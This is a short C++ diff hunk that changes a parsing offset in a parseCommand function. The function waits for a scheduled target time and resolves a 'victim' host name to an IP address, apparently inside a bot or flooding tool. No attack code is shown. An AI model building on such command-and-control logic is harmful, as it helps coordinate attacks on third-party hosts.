@@ -188,7 +188,7 @@ void parseCommand(char command[])
 	        struct hostent *hostinfo = NULL; //Host name
 	        char victim_ip[256];
 	        cout << command << endl;
-	        waitUntilTargettime(command+15+i*19);
+	        waitUntilTargettime(command+15+i*24);
 	        hostinfo = gethostbyname(victim);
 	        sprintf(victim_ip,"%s",inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)));
 	        cout << victim_ip << endl;
